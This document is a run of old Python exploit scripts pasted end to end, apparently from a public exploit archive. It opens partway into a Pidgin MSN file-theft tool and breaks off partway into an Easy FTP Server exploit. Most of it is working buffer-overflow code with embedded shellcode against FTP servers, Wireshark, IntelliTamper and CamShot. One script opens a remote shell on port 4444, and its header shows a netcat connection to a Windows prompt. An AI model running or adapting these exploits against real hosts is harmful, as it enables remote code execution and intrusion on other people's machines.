		super(MyMSNObjectStore, self)._outgoing_session_transfer_completed(session, data)

class ClientEventHandler(pymsn.event.ClientEventInterface):
			
	def on_client_error(self, error_type, error):
		if error_type == pymsn.event.ClientErrorType.AUTHENTICATION:
			 print "[+] Authentication failed, bad login/password"
			 self._client.quit()
		else:
			 print "[*] ERROR :", error_type, " ->", error
			 
	def on_client_state_changed(self, state):
		#print "State changed to %s" % state
		if state == pymsn.client.ClientState.CLOSED:
			print "[+] Connection to server closed"
			self._client.quit()
            
		if state == pymsn.client.ClientState.CONNECTING:
			if self.current_state != state:
				print "[+] Connecting to server"
			self.current_state = state
		if state == pymsn.client.ClientState.AUTHENTICATING:
			if self.current_state != state:
				print "[+] Authentication in progress"
			self.current_state = state
		if state == pymsn.client.ClientState.SYNCHRONIZING:
			if self.current_state != state:
				print "[+] Synchronisation in progress"
			self.current_state = state

		if state == pymsn.client.ClientState.OPEN:
			print "[+] OK, all done, ready to proceed"
			self._client.profile.presence = pymsn.Presence.INVISIBLE
			contact_dict = {}
			for i in self._client.address_book.contacts:
				contact_dict[i.account] = i
			if self._client.list_only:
				for (k,v) in contact_dict.items():
					print k+" ("+v.display_name+")"
				self._client.quit()
			else:
				if self._client.victim not in contact_dict.keys():
					print "[*] Error, contact %s not in your contact list"%self._client.victim
					self._client.quit()
				else: 
					contact = contact_dict[self._client.victim]
					store = MyMSNObjectStore(self._client)
					object = pymsn.p2p.MSNObject(contact, 65535, pymsn.p2p.MSNObjectType.CUSTOM_EMOTICON, self._client.filename, 'AAA=','2jmj7l5rSw0yVb/vlWAYkK/YBwk=')
					print "[+] Sending request for file \"%s\" to \"%s\""%(self._client.filename, self._client.victim)
					self._client.begin = time.time()
					store.request(object, [handle_answer, self._client])
					# at this moment, we got only one session_id, the one we will use to request the file
					for k in store._outgoing_sessions.keys():
						print "[+] Using session_id %d"%k._id
						self._client.session_id = k._id
					# hack to set up my own callback each time we receive a chunk, used to print the percentage of the download
					self._client._p2p_session_manager._transport_manager._on_chunk_received_OLD = self._client._p2p_session_manager._transport_manager._on_chunk_received
					self._client._p2p_session_manager._transport_manager._on_chunk_received = my_on_chunk_recv
					# if no file transfer received from the victim after TIMEOUT seconds, quit
					gobject.timeout_add(TIMEOUT*1000, check_if_succeeds)

	def __init__(self, client):
		self.current_state = None
		pymsn.event.ClientEventInterface.__init__(self, client)


if __name__ == '__main__':
	print "***********************************************************\n"
	print "Pidgin MSN file download vulnerability (CVE-2010-0013)\n"
	print "Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l]\n"
	print "***********************************************************\n"

	usage = "Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l] "
	parser = OptionParser(usage=usage)
	parser.add_option("-f", "--file", dest="filename", default=None,
					  help="File requested to remote contact")
	parser.add_option("-o", "--output", dest="output_file", default=None,
					  help="Where to write received file, STDOUT otherelse")
	parser.add_option("-a", "--account", dest="account", default=None,
					  help="MSN account to use")
	parser.add_option("-c", "--contact", dest="contact", default=None,
					  help="Contact to request file from")
	parser.add_option("-l", "--list", dest="list_only", action="store_true", default=False,
					  help="Just print contact list for your account and exit")
	
	(options, args) = parser.parse_args()
	if not options.filename or not options.account or not options.contact:
		if not (options.account and options.list_only):
			print "Error, parameter missing"
			parser.print_help()
			sys.exit(-1)

	if options.output_file != None:
		try:
			FD_OUT = open(options.output_file,"wb")
		except Exception,e:
			print "Cannot open file %s (%s)"%(options.output_file, e)
			sys.exit(-1)

	MAINLOOP = gobject.MainLoop()

	def sigterm_cb():
		gobject.idle_add(quit)

	signal.signal(signal.SIGTERM, sigterm_cb)

	logging.basicConfig(level=logging.CRITICAL) # allows us to see the protocol debug
	server = (SERVER_ADDRESS, SERVER_PORT)
	client = MyClient(server, quit, options.contact, options.filename, options.list_only)
	global_client = client
	client_events_handler = ClientEventHandler(client)
	print "Please enter the password for the account \"%s\""%options.account
	try:
		passwd = getpass.getpass()
	except KeyboardInterrupt:
		quit()

	login_info = (options.account, passwd)
	client.login(*login_info)
	try:
		MAINLOOP.run()
	except KeyboardInterrupt:
		quit()
# IntelliTamper 2.07/2.08 (SEH) Remote Buffer Overflow
# Based on PoC: http://www.exploit-db.com/exploits/11217
# Author: loneferret
# Big thanks to: dookie
# Tested on WinXP SP3 English

# Just copy the resulting html file on a web server, and point Intelli Tamper to that adress.
# Should get a calculator

# Thanks to dookie for telling me to stick to it.
# Exploit-DB : Try Harder (tm)


#!/usr/bin/python
#badchar list: \x00\x3C\x01
buffer = '<html><head><title>loneferret test</title></head><body>'
buffer += '<script defer="'

buffer += '\x41' * 6236 # junk
buffer += '\x90' * 180 # nop slide 1

# win32_exec -
# EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */

buffer += '\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x4d'
buffer += '\x53\x9e\xc5\x83\xeb\xfc\xe2\xf4\xb1\xbb\xda\xc5\x4d\x53\x15\x80'
buffer += '\x71\xd8\xe2\xc0\x35\x52\x71\x4e\x02\x4b\x15\x9a\x6d\x52\x75\x8c'
buffer += '\xc6\x67\x15\xc4\xa3\x62\x5e\x5c\xe1\xd7\x5e\xb1\x4a\x92\x54\xc8'
buffer += '\x4c\x91\x75\x31\x76\x07\xba\xc1\x38\xb6\x15\x9a\x69\x52\x75\xa3'
buffer += '\xc6\x5f\xd5\x4e\x12\x4f\x9f\x2e\xc6\x4f\x15\xc4\xa6\xda\xc2\xe1'
buffer += '\x49\x90\xaf\x05\x29\xd8\xde\xf5\xc8\x93\xe6\xc9\xc6\x13\x92\x4e'
buffer += '\x3d\x4f\x33\x4e\x25\x5b\x75\xcc\xc6\xd3\x2e\xc5\x4d\x53\x15\xad'
buffer += '\x71\x0c\xaf\x33\x2d\x05\x17\x3d\xce\x93\xe5\x95\x25\xa3\x14\xc1'
buffer += '\x12\x3b\x06\x3b\xc7\x5d\xc9\x3a\xaa\x30\xff\xa9\x2e\x7d\xfb\xbd'
buffer += '\x28\x53\x9e\xc5'

buffer += '\x90' * 243 # nop slide 2

buffer += '\xE9\x55\xFE\xFF\xFF'# jumps back in nop slide 1
buffer += '\xeb\xd0\x90\x90' # small jump back in nop slide 2
buffer += '\x3b\x10\x40\x00' # 0x0040103b intellitamper.exe

buffer += '\x43' * 50

buffer += '">'
buffer + '</body></html>'
file=open('index.html','w')
file.write(buffer)
file.close()# CamShot SEH overwrite by tecnik

import socket, sys

if len(sys.argv)!=2:
    print "Usage: camshot.py <target>"
    exit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],80))

print "Sending Exploit to:" + sys.argv[1]

# GET request + overflow string
request  ="GET /"
request +="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# short jump over SE Handler Addr overwrite
request +="\x90\x90\xEB\x07"
# overwrite SEH to point to mfc40.dll (no SafeSeh) JMP [EBP-4]
request +="\x9A\xF7\xA9\x61"
# NOP's I haven't cleaned up; SUB EBP,-508; XCHG EBP,EDX; (to setup Base Addr for ALPHA3 encoded shellcode)
request +="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x81\xED\xF8\xFA\xFF\xFF\x90\x90\x87\xEA" 

# ALPHA3 encoded (lowercase ascii with EDX base) Metasploit shellcode (Exec calc.exe)
request +="j314d34djq34djk34d1421r11r7j314d34dj234dkmr502dr5o0d25usz85561k20213o83060499913o2656e327e79ld1303l2k88gnd0x3xmxlk856c7cn40k049kle6570ob0xkk9d3901ok5d3dnx5c0emxn831o57cox6x5d4b5dng6fkg322532l911l4of4k8k3x89ldmc151xj953nfkx6f333c19l0me645g1254okmel505023co30eo87fm178jg30m8n2l14g4c8el342997b5x9xn049845xok4415503g3gn41fmdlb6fnk629cjkk2j59878n23e413881nb9c1fme241gl1nx0e711369ne90j13e0b120dke581d42121co07c83k2lele4x5k3d7go84d9c015x038d32l5o36g088c0b930229j9oe7x332bjg8f3825nk422081888clx9g0k3cl5j8kf7139197"


request +=" HTTP/1.1\r\n"
request +="HOST: 127.0.0.1\r\n\r\n"

s.send(request)

print "Done."

s.close()
# Exploit Title: Vermillion FTP Deamon Remote BOF Exploit
# Date: 29/01/2010
# Author: Dz_attacker
# Software Link: http://www.softsea.com/download/Vermillion-FTP-Daemon.html
# Version: 1.31
# Tested on: Windows xp sp3
# Code :

#!/usr/bin/python

#[+] Original : http://www.global-evolution.info/news/files/vftpd/vftpd.txt

import socket
import sys
import time

if (len(sys.argv) != 2):
print "+++++++++++++++++++++++++++++++++++++++++++++++++"
print "[+] Vftpd Remote BOF Exploit"
print "[+] Exploit By Dz_attacker (dz_attacker@hotmail.fr)"
print "[+] Usage : %s <target_ip>" %sys.argv[0]
print "+++++++++++++++++++++++++++++++++++++++++++++++++\n"
sys.exit(0)



# win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x5a\x32\x37\x44\x5a\x32\x37\x90\x90\x90\x90\x90\x90\x90\x90"
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc1"
"\xbc\xec\x76\x83\xeb\xfc\xe2\xf4\x3d\x54\xa8\x76\xc1\xbc\x67\x33"
"\xfd\x37\x90\x73\xb9\xbd\x03\xfd\x8e\xa4\x67\x29\xe1\xbd\x07\x3f"
"\x4a\x88\x67\x77\x2f\x8d\x2c\xef\x6d\x38\x2c\x02\xc6\x7d\x26\x7b"
"\xc0\x7e\x07\x82\xfa\xe8\xc8\x72\xb4\x59\x67\x29\xe5\xbd\x07\x10"
"\x4a\xb0\xa7\xfd\x9e\xa0\xed\x9d\x4a\xa0\x67\x77\x2a\x35\xb0\x52"
"\xc5\x7f\xdd\xb6\xa5\x37\xac\x46\x44\x7c\x94\x7a\x4a\xfc\xe0\xfd"
"\xb1\xa0\x41\xfd\xa9\xb4\x07\x7f\x4a\x3c\x5c\x76\xc1\xbc\x67\x1e"
"\xfd\xe3\xdd\x80\xa1\xea\x65\x8e\x42\x7c\x97\x26\xa9\xc2\x34\x94"
"\xb2\xd4\x74\x88\x4b\xb2\xbb\x89\x26\xdf\x8d\x1a\xa2\xbc\xec\x76")

stage = "92060006,92080001,92120010,92150015,92000015,92040002,"
stage += "92050002,92060010,92000002,92050008,92120013,92020014,"
stage += "92030012,92000005,92050010,92070004,92140015,92110008,"
stage += "92040004,92050010,92030002,92030007,92080011,92150010,"
stage += "92100015,92070005,92140010,92100015,92070005,92140007,"
stage += "92150015,92140007,"

payload = shellcode + "\x44"*(500-len(shellcode))

buffer = "92040001,"*11
buffer += stage
buffer += "92020004,"
buffer += "92150011,"
buffer += "92010002,"
buffer += "92000000,"
buffer += "92020013,"
buffer += "92070000,"
buffer += "92040002,"
buffer += "92000000,"
buffer += "2"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],21))
print "[x] Sending Shellcode..."
s.recv(1024)
s.send('USER '+payload+'\r\n')
s.recv(1024)
s.send('PASS '+payload+'\r\n')
s.recv(1024)
s.send('SYST\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.recv(1024)
s.close()

time.sleep(2)

s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((sys.argv[1],21))
print "[x] Sending Exploit..."
s2.send('PORT '+buffer+'\r\n')
s2.close()
time.sleep(2)
print "[x] Hunting the shellcode..."
time.sleep(3)
raw_input("[x] Done, press enter to quit")#!/usr/bin/python
#
# Title: UplusFtp Server 1.7.0.12 Remote Buffer Overflow
# Date: 02-03-2010
# Author: b0telh0
# Link: http://easyftpsvr.googlecode.com/files/uplusftp-server-1.7.0.12-en.zip
# Tested on: Windows XP SP3

# CWD, DELE, LIST, MKD, NLST (and etc) commands are also vulnerable.
# 


import socket
import time

# windows/exec - 227 bytes
# EXITFUNC=process, CMD=calc.exe
shellcode = ("\x29\xc9\xb1\x33\xda\xd3\xbd\x07\x4a\x9e\x37\xd9\x74\x24\xf4"
        "\x5b\x83\xc3\x04\x31\x6b\x0f\x03\x6c\x45\x7c\xc2\x8e\xb1\x09"
        "\x2d\x6e\x42\x6a\xa7\x8b\x73\xb8\xd3\xd8\x26\x0c\x97\x8c\xca"
        "\xe7\xf5\x24\x58\x85\xd1\x4b\xe9\x20\x04\x62\xea\x84\x88\x28"
        "\x28\x86\x74\x32\x7d\x68\x44\xfd\x70\x69\x81\xe3\x7b\x3b\x5a"
        "\x68\x29\xac\xef\x2c\xf2\xcd\x3f\x3b\x4a\xb6\x3a\xfb\x3f\x0c"
        "\x44\x2b\xef\x1b\x0e\xd3\x9b\x44\xaf\xe2\x48\x97\x93\xad\xe5"
        "\x6c\x67\x2c\x2c\xbd\x88\x1f\x10\x12\xb7\x90\x9d\x6a\xff\x16"
        "\x7e\x19\x0b\x65\x03\x1a\xc8\x14\xdf\xaf\xcd\xbe\x94\x08\x36"
        "\x3f\x78\xce\xbd\x33\x35\x84\x9a\x57\xc8\x49\x91\x63\x41\x6c"
        "\x76\xe2\x11\x4b\x52\xaf\xc2\xf2\xc3\x15\xa4\x0b\x13\xf1\x19"
        "\xae\x5f\x13\x4d\xc8\x3d\x79\x90\x58\x38\xc4\x92\x62\x43\x66"
        "\xfb\x53\xc8\xe9\x7c\x6c\x1b\x4e\x72\x26\x06\xe6\x1b\xef\xd2"
        "\xbb\x41\x10\x09\xff\x7f\x93\xb8\x7f\x84\x8b\xc8\x7a\xc0\x0b"
        "\x20\xf6\x59\xfe\x46\xa5\x5a\x2b\x25\x28\xc9\xb7\x84\xcf\x69"
        "\x5d\xd9");

junk = "\x90" * 41
eip = "\x4e\xae\x3a\x7e"               #7E3AAE4E   JMP ESI USER32.dll
nops = "\x90" * 28

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "\n[+] UplusFtp Server v1.7.0.12 Exploit!"
    connect=s.connect(('10.1.1.110',21))
    d=s.recv(1024)
    print "[+] " +d
    print "[+] Sending username..."
    time.sleep(1)
    s.send('USER test\r\n')
    s.recv(1024)
    print "[+] Sending password..."
    time.sleep(1)
    s.send('PASS test\r\n')
    s.recv(1024)
    print "[+] Sending buffer..."
    time.sleep(1)
    s.send('APPE ' + junk + shellcode + eip + nops + 'r\n')
    print "[.] done!\n"
except:
    print "[-] Can't connect to ftp server!\n"

################################################################
#Title: Open & Compact FTPd Pre-Authentication Remote Exploit
#
#Written by: Lincoln
#Originally discovered by: loneferret
#Reference:
#http://www.exploit-db.com/exploits/11391
#Tested on: XPSP2
#root@box:~# ./ftpd.py 192.168.139.130
#
#Try connecting to host on port 4444
#
#root@box:~# nc -vn 192.168.139.130 4444
#(UNKNOWN) [192.168.139.130] 4444 (?) open
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\crap\Desktop\Release>
#################################################################

import socket,sys
host = sys.argv[1]

#[*] x86/shikata_ga_nai succeeded with size 369 (iteration=1)

sc = ("\x31\xc9\xbd\xdd\x2b\x25\x18\xb1\x56\xdb\xcb\xd9\x74\x24\xf4"
"\x58\x31\x68\x10\x83\xe8\xfc\x03\x68\x0c\x3f\xde\xd9\xf0\x36"
"\x21\x22\x01\x28\xab\xc7\x30\x7a\xcf\x8c\x61\x4a\x9b\xc1\x89"
"\x21\xc9\xf1\x1a\x47\xc6\xf6\xab\xed\x30\x38\x2b\xc0\xfc\x96"
"\xef\x43\x81\xe4\x23\xa3\xb8\x26\x36\xa2\xfd\x5b\xb9\xf6\x56"
"\x17\x68\xe6\xd3\x65\xb1\x07\x34\xe2\x89\x7f\x31\x35\x7d\x35"
"\x38\x66\x2e\x42\x72\x9e\x44\x0c\xa3\x9f\x89\x4f\x9f\xd6\xa6"
"\xbb\x6b\xe9\x6e\xf2\x94\xdb\x4e\x58\xab\xd3\x42\xa1\xeb\xd4"
"\xbc\xd4\x07\x27\x40\xee\xd3\x55\x9e\x7b\xc6\xfe\x55\xdb\x22"
"\xfe\xba\xbd\xa1\x0c\x76\xca\xee\x10\x89\x1f\x85\x2d\x02\x9e"
"\x4a\xa4\x50\x84\x4e\xec\x03\xa5\xd7\x48\xe5\xda\x08\x34\x5a"
"\x7e\x42\xd7\x8f\xf8\x09\xb0\x7c\x36\xb2\x40\xeb\x41\xc1\x72"
"\xb4\xf9\x4d\x3f\x3d\x27\x89\x40\x14\x9f\x05\xbf\x97\xdf\x0c"
"\x04\xc3\x8f\x26\xad\x6c\x44\xb7\x52\xb9\xca\xe7\xfc\x12\xaa"
"\x57\xbd\xc2\x42\xb2\x32\x3c\x72\xbd\x98\x4b\xb5\x73\xf8\x1f"
"\x51\x76\xfe\x8e\xfd\xff\x18\xda\xed\xa9\xb3\x73\xcf\x8d\x0b"
"\xe3\x30\xe4\x27\xbc\xa6\xb0\x21\x7a\xc9\x40\x64\x28\x66\xe8"
"\xef\xbb\x64\x2d\x11\xbc\xa1\x05\x58\x84\x21\xdf\x34\x46\xd0"
"\xe0\x1c\x30\x71\x72\xfb\xc1\xfc\x6f\x54\x95\xa9\x5e\xad\x73"
"\x47\xf8\x07\x66\x9a\x9c\x60\x22\x40\x5d\x6e\xaa\x05\xd9\x54"
"\xbc\xd3\xe2\xd0\xe8\x8b\xb4\x8e\x46\x6d\x6f\x61\x31\x27\xdc"
"\x2b\xd5\xbe\x2e\xec\xa3\xbf\x7a\x9a\x4c\x71\xd3\xdb\x73\xbd"
"\xb3\xeb\x0c\xa0\x23\x13\xc7\x61\x53\x5e\x4a\xc3\xfc\x07\x1e"
"\x56\x61\xb8\xf4\x94\x9c\x3b\xfd\x64\x5b\x23\x74\x61\x27\xe3"
"\x64\x1b\x38\x86\x8a\x88\x39\x83\x81")

buf = "\x42\x2c\x20" * 199 + "\x90" * 10 + sc

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 21))
s.recv(1024)
s.send("USER " + buf + "\r\n")
s.recv(1024)
print "\nTry connecting to host on port 4444\n"
s.close()#!/usr/bin/env python
# Wireshark 1.2.5 LWRES getaddrbyname stack-based buffer overflow
# Discovered by babi
# Reference: http://www.exploit-db.com/exploits/11288
# Exploit Dev by Nullthreat & Pure|Hate

import socket, sys

try:
  host = sys.argv[1]
except:
  print "usage: " + sys.argv[0] + " <host>"
  exit(2)

port = 921
addr = (host, port)

leng = 9150
high = int(leng / 256)
low = leng & 255

crash = ("A" * 2128)

# Short jump
jmp = "\x90\x90\x06\xeb"

# pop/pop/ret in pcre3 0x61b4121b
ppr = "\x1b\x12\xb4\x61"

nop  = ("\x90" * 24)

# 224 bytes = calc.exe
shellcode = (
"\xbf\x86\x0a\x33\xa0\x2b\xc9\xda\xd9\xd9\x74\x24\xf4\xb1"
"\x32\x5e\x31\x7e\x11\x03\x7e\x11\x83\xc6\x82\xe8\xc6\x5c"
"\x62\x65\x28\x9d\x72\x16\xa0\x78\x43\x04\xd6\x09\xf1\x98"
"\x9c\x5c\xf9\x53\xf0\x74\x8a\x16\xdd\x7b\x3b\x9c\x3b\xb5"
"\xbc\x10\x84\x19\x7e\x32\x78\x60\x52\x94\x41\xab\xa7\xd5"
"\x86\xd6\x47\x87\x5f\x9c\xf5\x38\xeb\xe0\xc5\x39\x3b\x6f"
"\x75\x42\x3e\xb0\x01\xf8\x41\xe1\xb9\x77\x09\x19\xb2\xd0"
"\xaa\x18\x17\x03\x96\x53\x1c\xf0\x6c\x62\xf4\xc8\x8d\x54"
"\x38\x86\xb3\x58\xb5\xd6\xf4\x5f\x25\xad\x0e\x9c\xd8\xb6"
"\xd4\xde\x06\x32\xc9\x79\xcd\xe4\x29\x7b\x02\x72\xb9\x77"
"\xef\xf0\xe5\x9b\xee\xd5\x9d\xa0\x7b\xd8\x71\x21\x3f\xff"
"\x55\x69\xe4\x9e\xcc\xd7\x4b\x9e\x0f\xbf\x34\x3a\x5b\x52"
"\x21\x3c\x06\x39\xb4\xcc\x3c\x04\xb6\xce\x3e\x27\xde\xff"
"\xb5\xa8\x99\xff\x1f\x8d\x55\x4a\x3d\xa4\xfd\x13\xd7\xf4"
"\x60\xa4\x0d\x3a\x9c\x27\xa4\xc3\x5b\x37\xcd\xc6\x20\xff"
"\x3d\xbb\x39\x6a\x42\x68\x3a\xbf\x21\xef\xa8\x23\xa6\xe5"
)

crash2 = ("\xcc" * 6752)

data  = "\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
data += "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
data += "\x00\x00\x00\x01"
data += chr(high) + chr(low) + crash + jmp + ppr + nop  + shellcode + crash2 + "\x00\x00"

udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
  udps.sendto(data, addr)
except:
  print "can't lookup host"
  exit(1)

udps.close()
exit(0)#!/usr/bin/python

# Title: Easy~Ftp Server v1.7.0.2 Post-Authentication BoF
# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
# Author: dookie2000ca
# Date: 14/02/2010
# Found by: loneferret
# Date Found: 13/02/2010

# Software link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip
# Tested on: Windows XP SP3 Professional

import socket
import sys

# msfpayload windows/exec cmd=calc.exe R | msfencode -b '\x00\x0a\x2f\x5c' -e x86/shikata_ga_nai -t c
# [*] x86/shikata_ga_nai succeeded with size 228 (iteration=1)

shellcode = ("\xd9\xcc\x31\xc9\xb1\x33\xd9\x74\x24\xf4\x5b\xba\x99\xe4\x93"
"\x62\x31\x53\x18\x03\x53\x18\x83\xc3\x9d\x06\x66\x9e\x75\x4f"
"\x89\x5f\x85\x30\x03\xba\xb4\x62\x77\xce\xe4\xb2\xf3\x82\x04"
"\x38\x51\x37\x9f\x4c\x7e\x38\x28\xfa\x58\x77\xa9\xca\x64\xdb"
"\x69\x4c\x19\x26\xbd\xae\x20\xe9\xb0\xaf\x65\x14\x3a\xfd\x3e"
"\x52\xe8\x12\x4a\x26\x30\x12\x9c\x2c\x08\x6c\x99\xf3\xfc\xc6"
"\xa0\x23\xac\x5d\xea\xdb\xc7\x3a\xcb\xda\x04\x59\x37\x94\x21"
"\xaa\xc3\x27\xe3\xe2\x2c\x16\xcb\xa9\x12\x96\xc6\xb0\x53\x11"
"\x38\xc7\xaf\x61\xc5\xd0\x6b\x1b\x11\x54\x6e\xbb\xd2\xce\x4a"
"\x3d\x37\x88\x19\x31\xfc\xde\x46\x56\x03\x32\xfd\x62\x88\xb5"
"\xd2\xe2\xca\x91\xf6\xaf\x89\xb8\xaf\x15\x7c\xc4\xb0\xf2\x21"
"\x60\xba\x11\x36\x12\xe1\x7f\xc9\x96\x9f\x39\xc9\xa8\x9f\x69"
"\xa1\x99\x14\xe6\xb6\x25\xff\x42\x48\x6c\xa2\xe3\xc0\x29\x36"
"\xb6\x8d\xc9\xec\xf5\xab\x49\x05\x86\x48\x51\x6c\x83\x15\xd5"
"\x9c\xf9\x06\xb0\xa2\xae\x27\x91\xc0\x31\xbb\x79\x29\xd7\x3b"
"\x1b\x35\x1d")

sled = "\x90" * 10
filler = "\x90" * 30
eip = "\x8B\x38\xAB\x71" # 71AB388B JMP EBP WS2_32.DLL
trailer = "\x43" * 48

evil = sled + shellcode + filler + eip + trailer

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.142',21))
s.recv(1024)
s.send('USER dookie\r\n')
s.recv(1024)
s.send('PASS dookie\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close# Exploit Title: Easy~Ftp Server v1.7.0.2 (HTTP) Remote BOF Exploit
# Date: 18-02-2010
# Author: ThE g0bL!N
# Software Link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip
# Code :
#!/usr/bin/python

import sys
import socket
import base64

if len(sys.argv) != 4:
print "\n****************************************************"
print "[*] Easy~Ftp Server v1.7.0.2 (HTTP) Remote BOF Exploit\n"
print "[*] Usage : ./sploit.py <target_ip> <user> <password>\n"
print "[*] Example : ./sploit.py 192.168.1.3 anonymous w00t\n"
print "*****************************************************"
sys.exit(0)

user = sys.argv[2]
pwd = sys.argv[3]
auth = base64.b64encode(user+":"+pwd)

# win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x7A\x32\x37\x44\x7A\x32\x37"
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x50\x42\x30\x42\x30\x4b\x58\x45\x34\x4e\x43\x4b\x38\x4e\x47"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x48"
"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x58\x46\x53\x4b\x58"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x58"
"\x4f\x45\x46\x42\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x30\x4b\x54"
"\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x58"
"\x41\x50\x4b\x4e\x49\x58\x4e\x35\x46\x32\x46\x50\x43\x4c\x41\x33"
"\x42\x4c\x46\x56\x4b\x48\x42\x54\x42\x43\x45\x58\x42\x4c\x4a\x57"
"\x4e\x50\x4b\x58\x42\x54\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x38\x42\x48\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x36\x4e\x53\x4f\x45\x41\x43"
"\x48\x4f\x42\x46\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x35\x4a\x56\x50\x57\x4a\x4d\x44\x4e\x43\x37\x4a\x56\x4a\x59"
"\x50\x4f\x4c\x58\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x46"
"\x4e\x36\x43\x36\x42\x50\x5a")

egghunter=(
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buf = "\x61"*268
buf += "\xF0\x69\x83\x7C" #CALL ESP XP SP3
buf += "\x63"*8
buf += egghunter

head = "GET /list.html?path="+buf+" HTTP/1.1\r\n"
head += "Host: "+shellcode+"\r\n"
head += "Authorization: Basic "+auth+"\r\n"

try:
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],8080))
s.send(head + "\r\n")
print "[x] Payload sended waiting for shellcode..."
s.close()
except:
print "Error!"# Tested on: XP SP3 (Eng)
#!/usr/bin/python
import socket, sys

print """
*************************************************
*	Easy FTP Server 1.7.0.2 Remote BoF	*
*	    Discovered by: athleet	 		*
*	jonbutler88[at]googlemail[dot]com	*
*************************************************
"""

if len(sys.argv) != 3:
	print "Usage: ./easyftp.py <Target IP> <Port>"
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

# Calc.exe PoC shellcode - Tested on XP Pro SP3 (Eng)
#
# B *0X009AFE44
#
shellcode = (
"\xba\x20\xf0\xfd\x7f" # 			MOV EDX,7FFDF020
"\xc7\x02\x4c\xaa\xf8\x77" # 		MOV DWORD PTR DS:[EDX],77F8AA4C
"\x33\xC0" # 						XOR EAX,EAX
"\x50" # 							PUSH EAX
"\x68\x63\x61\x6C\x63" #			PUSH 636C6163
"\x54" #							PUSH ESP
"\x5B" #							POP EBX
"\x50" #							PUSH EAX
"\x53" #							PUSH EBX
"\xB9\xC7\x93\xC2\x77" #			MOV ECX,77C293C7
"\xFF\xD1" #						CALL ECX
"\xEB\xF7" #						JMP SHORT 009AFE5B
)

nopsled = "\x90" * (268 - len(shellcode))

ret = "\x58\xFD\x9A\x00"

payload = nopsled + shellcode + ret # 272 bytes

print "[+] Launching exploit against " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect((target, port))
	print "[+] Connected!"
except:
	print "[!] Connection failed!"
	sys.exit(0)
s.recv(1024) 
s.send('USER anonymous\r\n') 
s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024)
# Send payload...
